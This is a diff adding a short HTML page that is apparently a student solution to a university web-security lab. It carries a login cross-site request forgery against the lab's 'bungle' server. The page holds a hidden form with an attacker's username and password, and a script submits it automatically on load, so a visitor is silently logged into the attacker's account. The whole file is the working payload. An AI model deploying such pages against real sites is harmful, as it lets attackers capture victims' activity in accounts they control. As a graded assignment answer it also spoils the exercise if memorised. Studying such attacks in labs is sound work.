@@ -1,0 +1,19 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8">
+    <title></title>
+  </head>
+  <body>
+    <form id="csrfForm"
+          action="https://bungle.sysnet.ucsd.edu/login?csrfdefense=0&xssdefense=4"
+          method="POST">
+      <input type="hidden" name="username" value="attacker">
+      <input type="hidden" name="password" value="l33th4x">
+    </form>
+
+    <script>
+      document.getElementById("csrfForm").submit();
+    </script>
+  </body>
+</html>
